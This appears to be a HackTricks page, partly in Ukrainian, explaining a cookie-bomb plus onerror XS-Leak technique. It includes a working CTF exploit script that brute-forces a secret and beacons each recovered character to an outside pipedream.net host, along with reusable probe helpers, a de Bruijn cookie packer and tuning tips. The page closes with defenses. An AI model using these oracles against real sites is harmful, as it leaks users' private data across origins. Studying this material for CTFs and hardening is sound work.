# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: наповнення браузера жертви великою кількістю/великими cookies для target origin, так щоб наступні запити досягали лімітів сервера/запиту (request header size, URL size in redirects тощо).
- Error-event oracle: протиперевірка cross-origin endpoint за допомогою <script> (або іншого субресурсу) і розрізнення станів за onload та onerror.

High level idea
- Знайдіть цільовий endpoint, поведінка якого відрізняється для двох станів, які ви хочете перевірити (наприклад, search “hit” vs “miss”).
- Переконайтесь, що шлях “hit” викликає важку redirect chain або довгий URL, тоді як шлях “miss” залишається коротким. Наддувайте request headers за допомогою великої кількості cookies так, щоб тільки шлях “hit” призводив до збою сервера з HTTP error (наприклад, 431/414/400). Помилка переключає onerror і стає оріаклом для XS-Search.

When does this work
- Ви можете змусити браузер жертви надсилати cookies до цілі (наприклад, cookies мають SameSite=None або ви можете встановити їх у first-party context через popup window.open).
- Є функція в додатку, якою можна зловживати для встановлення довільних cookies (наприклад, “save preference” endpoints, що перетворюють контрольовані імена/значення input на Set-Cookie) або для створення post-auth redirects, які включають attacker-controlled дані в URL.
- Сервер реагує по-різному на два стани і, при надутому headers/URL, один зі станів перетинає ліміт і повертає error response, що тригерить onerror.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large зазвичай повертається, коли cookies роздувають request headers; 414 URI Too Long або серверно-специфічний 400 можуть повертатися для довгих цілей запиту. Будь-який з цих випадків призводить до невдалого завантаження субресурсу і викликає onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Чому popup (window.open)?
- Сучасні браузери все частіше блокують third‑party cookies. Відкриття топ‑рівневого вікна до цілі робить куки first‑party, тож Set-Cookie відповіді від цілі збережуться, дозволяючи крок cookie-bomb навіть при обмеженнях third‑party cookies.

2024–2025 notes on cookie availability
- Chromium-based browsers досі зазвичай відправляють third‑party cookies, якщо користувач або сайт цього не вимкнуть, тоді як Safari і Firefox за замовчуванням блокують більшість third‑party cookies. Плануйте на обидва випадки: (1) використати first‑party cookie planting flow (window.open + auto-submit to a cookie-setting endpoint) і потім (2) probe через subresource, який вдається лише коли ці куки відправляються. Якщо third‑party cookies заблоковані, перемістіть probe у same-site контекст (наприклад, запустіть the oracle у popup через same-site gadget і exfiltrate булеве значення за допомогою postMessage або beacon на ваш server).

Generic probing helper
If you already have a way to set many cookies on the target origin (first-party), you can reuse this minimal oracle against any endpoint whose success/failure leads to different network outcomes (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternative tag oracle (таблиця стилів)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Просунутий: de Bruijn–based cookie packing (CTF-proven)
- Коли додаток дозволяє вам контролювати великі значення cookie, ви можете ефективно упаковувати припущення, додаючи de Bruijn sequence до кожного probe. Це зберігає низькі накладні витрати на кожен probe і гарантує, що heavy branch послідовно є важчою лише для правильного префікса. Приклад генератора для |Σ| символів довжини n (поміщається в значенні cookie):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Ідея на практиці: встановіть кілька cookies, значення яких — префікс + deBruijn(k,n). Тільки коли перевіряний префікс правильний, сервер йде по «важчому» шляху (наприклад, додатковий redirect, який відображає довгий cookie або URL), що в поєднанні з cookie bloat перевищує ліміти і переключає onerror. Див. публічний solver LA CTF 2024, який використовує цей підхід.

Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using window.open loops.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly. [Cloudflare docs show the 128 KB header limit.]

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
- Avoid conditional redirects or large differences in response size between states. Return the same status, same content type, and similar body length regardless of state.
- Block cross-site subresource probes:
- SameSite cookies: set sensitive cookies to SameSite=Lax or Strict so subresource requests like <script src> don’t carry them; prefer Strict for auth tokens when possible.
- Fetch Metadata: enforce a Resource Isolation Policy to reject cross-site subresource loads (e.g., if Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): set CORP: same-origin (or at least same-site) for endpoints not meant to be embedded as cross-origin subresources.
- X-Content-Type-Options: nosniff and correct Content-Type on JSON/HTML endpoints to avoid load-as-script quirks.
- Reduce header/URL amplification:
- Cap the number/size of cookies set; sanitize features that turn arbitrary form fields into Set-Cookie.
- Normalize or truncate reflected data in redirects; avoid embedding attacker-controlled long strings in Location URLs.
- Keep server limits consistent and fail uniformly (avoid special error pages only for one branch).

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
